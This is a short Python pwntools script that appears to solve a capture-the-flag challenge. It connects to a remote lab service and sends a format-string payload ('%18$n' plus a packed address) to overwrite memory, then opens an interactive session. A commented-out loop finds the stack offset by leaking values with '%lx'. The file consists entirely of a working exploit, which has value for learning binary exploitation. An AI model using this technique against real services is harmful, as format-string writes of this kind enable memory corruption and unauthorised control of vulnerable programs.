#!/usr/bin/env python3
import pwn
import vpn_conf

HOST = vpn_conf.HOST
PORT = int(vpn_conf.BASE_PORT + 11)
BIN = "./the_answer_thaMilo"


def exploit():
    p = pwn.remote(HOST, PORT)
    payload = b"a" * 42 + b"%18$nA" + pwn.p64(0x404308)
    p.sendline(payload)
    p.interactive()

    # SCRIPT TO FIND THE STACK VARIABLE CONTAINING THE ADDRESS
    # for i in range(1, 50):
    #     p = pwn.remote(HOST, PORT)
    #     p.sendlineafter(b"name", b"a" * 42 + f"%{i}$lx".encode() + b"b" * 8)
    #     output = p.clean(0.7).decode().strip()
    #     p.close()
    #     if "62" * 8 in output:  # 62 is the lowercase b
    #         print(f" {i=} {output=}")
    #         return i


if __name__ == "__main__":
    exploit()
